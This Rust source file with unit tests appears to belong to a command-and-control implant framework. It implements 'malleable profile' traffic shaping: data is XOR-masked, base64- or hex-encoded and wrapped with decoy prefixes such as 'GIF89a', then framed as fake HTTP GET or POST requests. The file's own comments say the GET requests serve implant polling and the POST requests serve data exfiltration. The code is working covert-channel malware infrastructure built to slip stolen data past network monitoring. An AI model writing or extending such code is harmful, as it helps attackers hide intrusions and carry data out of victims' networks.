// src/traffic.rs
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use crate::common::{MalleableProfile, TransformStep, HttpBlock, MAX_FRAME_SIZE};
use std::io;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use rand::seq::SliceRandom;

/// Indicates which HTTP block (GET vs POST) to use for shaping.
/// GET is used for check-in / polling; POST is used for data exfiltration.
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum HttpDirection {
    Get,
    Post,
}

pub struct DataMolder;

impl DataMolder {
    /// Applies transformations defined in the profile (Outbound).
    fn apply_transform(data: &[u8], steps: &[TransformStep]) -> Vec<u8> {
        let mut buffer = data.to_vec();
        for step in steps {
            match step {
                TransformStep::Base64 => {
                    let b64 = BASE64.encode(&buffer);
                    buffer = b64.into_bytes();
                },
                TransformStep::Hex => {
                    let hex = hex::encode(&buffer);
                    buffer = hex.into_bytes();
                },
                TransformStep::Mask(key) => {
                    if !key.is_empty() {
                        for (i, byte) in buffer.iter_mut().enumerate() {
                            *byte ^= key[i % key.len()];
                        }
                    }
                },
                TransformStep::Prepend(s) => {
                    let mut new_buf = s.as_bytes().to_vec();
                    new_buf.extend_from_slice(&buffer);
                    buffer = new_buf;
                },
                TransformStep::Append(s) => {
                    buffer.extend_from_slice(s.as_bytes());
                }
            }
        }
        buffer
    }

    /// Reverses transformations (Inbound)
    fn reverse_transform(data: &[u8], steps: &[TransformStep]) -> io::Result<Vec<u8>> {
        let mut buffer = data.to_vec();
        for step in steps.iter().rev() {
            match step {
                TransformStep::Base64 => {
                    let clean: Vec<u8> = buffer.into_iter().filter(|b| !b.is_ascii_whitespace()).collect();
                    buffer = BASE64.decode(&clean).map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
                },
                TransformStep::Hex => {
                    buffer = hex::decode(&buffer).map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
                },
                TransformStep::Mask(key) => {
                    if !key.is_empty() {
                        for (i, byte) in buffer.iter_mut().enumerate() {
                            *byte ^= key[i % key.len()];
                        }
                    }
                },
                TransformStep::Prepend(s) => {
                    let p_bytes = s.as_bytes();
                    if buffer.starts_with(p_bytes) {
                        buffer = buffer[p_bytes.len()..].to_vec();
                    } else {
                        return Err(io::Error::new(io::ErrorKind::InvalidData, "Prepend Mismatch"));
                    }
                },
                TransformStep::Append(s) => {
                    let a_bytes = s.as_bytes();
                    if buffer.ends_with(a_bytes) {
                        buffer = buffer[..buffer.len() - a_bytes.len()].to_vec();
                    } else {
                        return Err(io::Error::new(io::ErrorKind::InvalidData, "Append Mismatch"));
                    }
                }
            }
        }
        Ok(buffer)
    }

    /// Construct HTTP Request/Response Wrapper
    fn build_http_frame(method: &str, block: &HttpBlock, user_agent: &str, body_data: &[u8]) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let default_uri = "/".to_string();
        let uri = block.uris.choose(&mut rng).unwrap_or(&default_uri);
        
        let mut headers = String::new();
        headers.push_str(&format!("{} {} HTTP/1.1\r\n", method, uri));
        headers.push_str(&format!("User-Agent: {}\r\n", user_agent));
        
        for (k, v) in &block.headers {
            headers.push_str(&format!("{}: {}\r\n", k, v));
        }

        // Always include Content-Length for reliable framing
        headers.push_str(&format!("Content-Length: {}\r\n", body_data.len()));
        headers.push_str("\r\n");

        let mut frame = headers.into_bytes();
        frame.extend_from_slice(body_data);
        frame
    }

    /// Resolve which HttpBlock and HTTP method to use for a given direction.
    fn resolve_block(profile: &MalleableProfile, direction: HttpDirection) -> (&HttpBlock, &str) {
        match direction {
            HttpDirection::Get => (&profile.http_get, "GET"),
            HttpDirection::Post => (&profile.http_post, "POST"),
        }
    }

    /// Read HTTP headers from stream, return (header_string, content_length).
    async fn read_http_headers<R: AsyncRead + Unpin>(reader: &mut R) -> io::Result<(String, usize)> {
        let mut header_buf = Vec::with_capacity(512);
        let mut byte = [0u8; 1];
        loop {
            reader.read_exact(&mut byte).await?;
            header_buf.push(byte[0]);
            if header_buf.ends_with(b"\r\n\r\n") { break; }
            if header_buf.len() > 8192 {
                return Err(io::Error::new(io::ErrorKind::InvalidData, "Header Too Large"));
            }
        }

        let header_str = String::from_utf8_lossy(&header_buf).to_string();

        // Parse Content-Length with case-insensitive matching (no repeated
        // allocation) and reject duplicate/conflicting values — ambiguous
        // framing is a smuggling vector.
        let mut content_len: Option<usize> = None;
        for line in header_str.lines() {
            if line.len() > 15 && line.as_bytes()[14] == b':'
                && line[..14].eq_ignore_ascii_case("content-length")
            {
                let val = line[15..].trim().parse::<usize>()
                    .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "Invalid Content-Length value"))?;
                if let Some(prev) = content_len {
                    if prev != val {
                        return Err(io::Error::new(io::ErrorKind::InvalidData, "Conflicting Content-Length headers"));
                    }
                    // Duplicate with same value — tolerated but already recorded
                } else {
                    content_len = Some(val);
                }
            }
        }

        Ok((header_str, content_len.unwrap_or(0)))
    }

    // --- PUBLIC API ---

    /// Send data with direction awareness.
    /// Use HttpDirection::Get for check-in/polling, HttpDirection::Post for data exfil.
    pub async fn send_directed<W>(
        writer: &mut W,
        data: &[u8],
        profile: &MalleableProfile,
        direction: HttpDirection,
    ) -> io::Result<()>
    where W: AsyncWrite + Unpin {
        if !profile.format_http {
            writer.write_u32(data.len() as u32).await?;
            writer.write_all(data).await?;
            writer.flush().await?;
            return Ok(());
        }

        let (block, method) = Self::resolve_block(profile, direction);
        let transformed = Self::apply_transform(data, &block.data_transform);
        let frame = Self::build_http_frame(method, block, &profile.user_agent, &transformed);
        
        writer.write_all(&frame).await?;
        writer.flush().await?;
        Ok(())
    }

    /// Backwards-compatible send (defaults to POST for data sending).
    pub async fn send<W>(writer: &mut W, data: &[u8], profile: &MalleableProfile) -> io::Result<()>
    where W: AsyncWrite + Unpin {
        Self::send_directed(writer, data, profile, HttpDirection::Post).await
    }

    /// Receive data with direction awareness.
    /// The direction indicates which transform block to reverse.
    pub async fn recv_directed<R>(
        reader: &mut R,
        profile: &MalleableProfile,
        direction: HttpDirection,
    ) -> io::Result<Vec<u8>>
    where R: AsyncRead + Unpin {
        if !profile.format_http {
            let len = reader.read_u32().await? as usize;
            if len > MAX_FRAME_SIZE {
                return Err(io::Error::new(io::ErrorKind::InvalidData, "Frame too large"));
            }
            let mut buf = vec![0u8; len];
            reader.read_exact(&mut buf).await?;
            return Ok(buf);
        }

        let (_header_str, content_len) = Self::read_http_headers(reader).await?;

        if content_len == 0 { return Ok(vec![]); }
        if content_len > MAX_FRAME_SIZE {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "HTTP frame too large"));
        }

        let mut body = vec![0u8; content_len];
        reader.read_exact(&mut body).await?;

        let (block, _) = Self::resolve_block(profile, direction);
        Self::reverse_transform(&body, &block.data_transform)
    }

    /// Backwards-compatible recv (defaults to POST transform reversal).
    pub async fn recv<R>(reader: &mut R, profile: &MalleableProfile) -> io::Result<Vec<u8>>
    where R: AsyncRead + Unpin {
        Self::recv_directed(reader, profile, HttpDirection::Post).await
    }

    /// Server-side handshake: detect raw vs HTTP-formatted initial connection.
    /// Handshake always uses raw framing (length-prefixed) regardless of profile,
    /// since the server doesn't know the client's profile until after the hello.
    /// Post-handshake traffic switches to the profile loaded from the DB.
    pub async fn detect_and_recv<R>(reader: &mut R) -> io::Result<(Vec<u8>, MalleableProfile)>
    where R: AsyncRead + Unpin {
        let mut prefix = [0u8; 4];
        reader.read_exact(&mut prefix).await?;

        // Handshake is always raw length-prefixed (both sides agree on this).
        // If we see HTTP method bytes, a misconfigured client sent HTTP for the handshake.
        // Try to recover by reading the HTTP frame anyway.
        if &prefix == b"POST" || &prefix == b"GET " {
            let mut header_buf = prefix.to_vec();
            let mut byte = [0u8; 1];
            loop {
                reader.read_exact(&mut byte).await?;
                header_buf.push(byte[0]);
                if header_buf.ends_with(b"\r\n\r\n") { break; }
                if header_buf.len() > 8192 {
                    return Err(io::Error::new(io::ErrorKind::InvalidData, "Handshake Header Too Large"));
                }
            }

            let header_str = String::from_utf8_lossy(&header_buf);
            let content_len = header_str.lines()
                .find(|l| l.to_lowercase().starts_with("content-length:"))
                .and_then(|l| l.split(':').nth(1))
                .and_then(|v| v.trim().parse::<usize>().ok())
                .unwrap_or(0);

            if content_len == 0 {
                return Err(io::Error::new(io::ErrorKind::InvalidData, "HTTP handshake with no body"));
            }
            if content_len > MAX_FRAME_SIZE {
                return Err(io::Error::new(io::ErrorKind::InvalidData, "HTTP handshake frame too large"));
            }

            let mut body = vec![0u8; content_len];
            reader.read_exact(&mut body).await?;

            // No transforms applied during handshake, body is raw JSON
            return Ok((body, MalleableProfile::default()));
        }

        // Standard raw mode: 4 bytes = big-endian length prefix
        let len = u32::from_be_bytes(prefix) as usize;
        if len > MAX_FRAME_SIZE {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "Handshake frame too large"));
        }
        let mut buf = vec![0u8; len];
        reader.read_exact(&mut buf).await?;
        Ok((buf, MalleableProfile::default()))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{MalleableProfile, HttpBlock, TransformStep};
    use std::collections::HashMap;
    use tokio::io::duplex;

    #[test]
    fn test_transform_base64_roundtrip() {
        let data = b"Hello, World! This is a test payload.";
        let steps = vec![TransformStep::Base64];
        let encoded = DataMolder::apply_transform(data, &steps);
        let decoded = DataMolder::reverse_transform(&encoded, &steps).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_hex_roundtrip() {
        let data = b"\x00\x01\x02\xff\xfe\xfd";
        let steps = vec![TransformStep::Hex];
        let encoded = DataMolder::apply_transform(data, &steps);
        let decoded = DataMolder::reverse_transform(&encoded, &steps).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_mask_roundtrip() {
        let data = b"sensitive data here";
        let steps = vec![TransformStep::Mask(vec![0xDE, 0xAD, 0xBE, 0xEF])];
        let masked = DataMolder::apply_transform(data, &steps);
        assert_ne!(masked, data); // Should be different
        let unmasked = DataMolder::reverse_transform(&masked, &steps).unwrap();
        assert_eq!(unmasked, data);
    }

    #[test]
    fn test_transform_prepend_append_roundtrip() {
        let data = b"payload";
        let steps = vec![
            TransformStep::Prepend("HEADER:".to_string()),
            TransformStep::Append(":FOOTER".to_string()),
        ];
        let wrapped = DataMolder::apply_transform(data, &steps);
        assert!(wrapped.starts_with(b"HEADER:"));
        assert!(wrapped.ends_with(b":FOOTER"));
        let unwrapped = DataMolder::reverse_transform(&wrapped, &steps).unwrap();
        assert_eq!(unwrapped, data);
    }

    #[test]
    fn test_transform_chained_roundtrip() {
        let data = b"multi-step transform test with binary \x00\xff data";
        let steps = vec![
            TransformStep::Mask(vec![0xCA, 0xFE]),
            TransformStep::Base64,
            TransformStep::Prepend("GIF89a".to_string()),
        ];
        let encoded = DataMolder::apply_transform(data, &steps);
        let decoded = DataMolder::reverse_transform(&encoded, &steps).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_empty_data() {
        let data = b"";
        let steps = vec![TransformStep::Base64, TransformStep::Hex];
        let encoded = DataMolder::apply_transform(data, &steps);
        let decoded = DataMolder::reverse_transform(&encoded, &steps).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_reverse_transform_prepend_mismatch() {
        let data = b"no_header_here";
        let steps = vec![TransformStep::Prepend("EXPECTED:".to_string())];
        let result = DataMolder::reverse_transform(data, &steps);
        assert!(result.is_err());
    }

    #[test]
    fn test_build_http_frame_has_content_length() {
        let block = HttpBlock {
            uris: vec!["/api/sync".to_string()],
            headers: HashMap::new(),
            data_transform: vec![],
        };
        let frame = DataMolder::build_http_frame("POST", &block, "TestAgent/1.0", b"test body");
        let frame_str = String::from_utf8_lossy(&frame);
        assert!(frame_str.contains("Content-Length: 9"));
        assert!(frame_str.contains("POST /api/sync HTTP/1.1"));
        assert!(frame_str.contains("User-Agent: TestAgent/1.0"));
    }

    #[test]
    fn test_build_http_frame_empty_body() {
        let block = HttpBlock::default();
        let frame = DataMolder::build_http_frame("GET", &block, "Agent", b"");
        let frame_str = String::from_utf8_lossy(&frame);
        assert!(frame_str.contains("Content-Length: 0"));
    }

    #[tokio::test]
    async fn test_raw_send_recv_roundtrip() {
        let profile = MalleableProfile::default(); // format_http = false → raw mode
        let data = b"test command payload";

        let (client, server) = duplex(4096);
        let (mut cr, mut cw) = tokio::io::split(client);
        let (mut sr, mut sw) = tokio::io::split(server);

        let send_task = tokio::spawn(async move {
            DataMolder::send(&mut cw, data, &profile).await.unwrap();
        });

        let profile2 = MalleableProfile::default();
        let recv_task = tokio::spawn(async move {
            DataMolder::recv(&mut sr, &profile2).await.unwrap()
        });

        send_task.await.unwrap();
        let received = recv_task.await.unwrap();
        assert_eq!(received, data);
    }

    #[tokio::test]
    async fn test_raw_send_recv_large_payload() {
        let profile = MalleableProfile::default();
        let data: Vec<u8> = (0..65536).map(|i| (i % 256) as u8).collect();

        let (client, server) = duplex(131072);
        let (mut _cr, mut cw) = tokio::io::split(client);
        let (mut sr, mut _sw) = tokio::io::split(server);

        let d = data.clone();
        tokio::spawn(async move {
            DataMolder::send(&mut cw, &d, &profile).await.unwrap();
        });

        let profile2 = MalleableProfile::default();
        let received = DataMolder::recv(&mut sr, &profile2).await.unwrap();
        assert_eq!(received.len(), 65536);
        assert_eq!(received, data);
    }

    #[tokio::test]
    async fn test_detect_and_recv_raw() {
        let (client, server) = duplex(4096);
        let (mut _cr, mut cw) = tokio::io::split(client);
        let (mut sr, mut _sw) = tokio::io::split(server);

        let data = b"{\"test\": true}";
        let profile = MalleableProfile::default();
        tokio::spawn(async move {
            DataMolder::send(&mut cw, data, &profile).await.unwrap();
        });

        let (received, _profile) = DataMolder::detect_and_recv(&mut sr).await.unwrap();
        assert_eq!(received, data);
    }
}
